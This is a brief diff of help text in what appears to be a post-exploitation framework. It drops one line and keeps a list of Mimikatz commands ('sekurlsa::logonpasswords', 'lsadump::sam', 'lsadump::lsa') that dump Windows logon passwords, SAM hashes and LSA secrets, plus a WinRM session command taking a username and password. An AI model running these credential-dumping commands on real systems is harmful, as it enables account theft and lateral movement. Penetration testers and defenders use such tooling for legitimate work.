@@ -312,7 +312,6 @@ invoke-winrmsession -ipaddress <ip> -user <dom\\user> -pass <pass>
 posh_help7 = """
 Credentials / Tokens / Local Hashes (Must be SYSTEM):
 =========================================================
-invoke-mimikatz | out-string | parse-mimikatz
 invoke-mimikatz -command '"sekurlsa::logonpasswords"'
 invoke-mimikatz -command '"lsadump::sam"'
 invoke-mimikatz -command '"lsadump::lsa"'
